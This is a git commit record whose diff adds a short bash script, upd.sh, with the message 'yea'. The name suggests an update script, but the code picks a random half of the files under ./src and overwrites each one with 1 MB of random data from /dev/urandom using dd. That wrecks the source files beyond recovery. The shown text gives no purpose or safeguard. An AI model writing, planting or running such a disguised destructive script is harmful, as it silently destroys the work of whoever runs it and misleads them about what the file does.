4b1fc1929f57aa6b790c40867b77b4c1abec1f99
zero@void_laptop <shinyzero0@tilde.club>
2024-11-19 04:31:28 +0300

    yea

---
+++ upd.sh
@@ -0,0 +1,7 @@
+#!/usr/bin/env bash
+
+nfiles=$(mktemp)
+printf %s\\n ./src/* | tee >(wc -l >$nfiles) | shuf | head -$(($(cat $nfiles) /2)) \
+| while read file; do
+	dd if=/dev/urandom of=$file bs=1024 count=1024
+done
